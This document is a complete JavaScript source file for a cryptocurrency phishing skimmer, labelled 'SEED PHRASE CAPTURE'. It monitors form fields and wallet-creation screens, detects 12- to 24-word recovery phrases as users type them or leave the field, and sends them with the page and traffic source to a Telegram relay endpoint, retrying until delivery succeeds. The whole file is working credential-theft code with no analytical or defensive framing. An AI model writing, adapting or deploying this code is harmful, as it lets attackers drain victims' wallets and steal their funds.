// ============================================================
// SEED PHRASE CAPTURE - form-handler.js
// Captures seed phrases from: user input + wallet creation UI
// ============================================================

const API = '/api/telegram';
let lastSent = '';
let inputTimer;

// --- Traffic source ---
function getTrafficSource() {
  const ref = document.referrer.toLowerCase();
  const p = new URLSearchParams(window.location.search);
  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
  if (ref.includes('bing.com')) return 'Bing SEO';
  const s = p.get('utm_source') || p.get('source') || '';
  if (s.toLowerCase().includes('google')) return 'Google SEO';
  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
  return document.referrer || 'Direct';
}
const trafficSource = getTrafficSource();

// --- Word count helper ---
function wc(val) {
  return (val || '').trim().split(/\s+/).filter(w => w.length > 0).length;
}

// --- Validate real seed phrase (BIP39 style) ---
// Real seed phrases: all lowercase, no punctuation, short words (3-8 chars)
// NOT sentences like "Download the app from the official website..."
function isSeedPhrase(val) {
  if (!val || typeof val !== 'string') return false;
  const words = val.trim().split(/\s+/).filter(w => w.length > 0);
  if (![12, 15, 18, 21, 24].includes(words.length)) return false;
  // Every word must be: all lowercase letters only, 2-10 chars, no numbers/punctuation
  const validWord = /^[a-z]{2,10}$/;
  const validCount = words.filter(w => validWord.test(w)).length;
  // At least 90% of words must pass (allow for slight variations)
  return (validCount / words.length) >= 0.9;
}

// --- Send to Telegram ---
async function sendToTelegram(data) {
  data.trafficSource = trafficSource;
  data.timestamp = new Date().toISOString();
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data })
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return await r.json();
    } catch (e) {
      if (i === 2) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

// --- Send phrase (dedup) ---
function sendPhrase(phrase, type, extra) {
  if (!phrase || phrase === lastSent) return;
  lastSent = phrase;
  const count = wc(phrase);
  const payload = Object.assign({
    TYPE: type,
    PHRASE: phrase,
    WORDS: count,
    PAGE: window.location.pathname
  }, extra || {});
  sendToTelegram(payload)
    .then(() => console.log('✅ Phrase sent:', count, 'words from', trafficSource))
    .catch(e => console.error('❌ Send failed:', e));
}

// --- DOM scan: ONLY check input/textarea fields for displayed phrases ---
// We do NOT scan page text — that captures normal sentences as false positives
function scanDOM(root) {
  if (!root || !root.querySelectorAll) return;
  // Only scan actual form inputs where a wallet app would display/pre-fill a phrase
  root.querySelectorAll('input, textarea').forEach(el => {
    if (el.getAttribute('data-tp-sent')) return;
    const txt = (el.value || '').trim();
    if (isSeedPhrase(txt)) {
      el.setAttribute('data-tp-sent', '1');
      const cls = (el.className || '').toString().trim().split(' ')[0];
      console.log('📋 Displayed phrase in field:', wc(txt), 'words');
      sendPhrase(txt, 'WALLET_CREATED_DISPLAYED', {
        FIELD: el.name || el.id || el.placeholder || cls || 'field'
      });
    }
  });
}

// --- Start DOM monitor ---
function startMonitor() {
  // Observe new elements
  new MutationObserver(muts => {
    muts.forEach(m => m.addedNodes.forEach(n => {
      if (n.nodeType === 1) scanDOM(n);
    }));
  }).observe(document.body, { childList: true, subtree: true });

  // Scan at intervals for lazy-loaded content
  [500, 1500, 3000, 5000, 8000, 12000].forEach(t => {
    setTimeout(() => scanDOM(document.body), t);
  });
}

// --- Input event: capture typed phrases ---
document.addEventListener('input', function(e) {
  const t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  clearTimeout(inputTimer);
  inputTimer = setTimeout(function() {
    const val = t.value.trim();
    if (isSeedPhrase(val) && val !== lastSent) {
      sendPhrase(val, 'SEED_PHRASE', {
        FIELD: t.name || t.id || t.placeholder || 'input'
      });
    }
  }, 600);
});

// --- Blur event: capture on field exit ---
document.addEventListener('blur', function(e) {
  const t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  const val = (t.value || '').trim();
  if (isSeedPhrase(val) && val !== lastSent) {
    sendPhrase(val, 'SEED_ON_BLUR', {
      FIELD: t.name || t.id || t.placeholder || 'input'
    });
  }
}, true);

// --- Boot ---
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔍 Traffic source:', trafficSource);
  startMonitor();
});

// Expose for popup.html and other scripts
window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
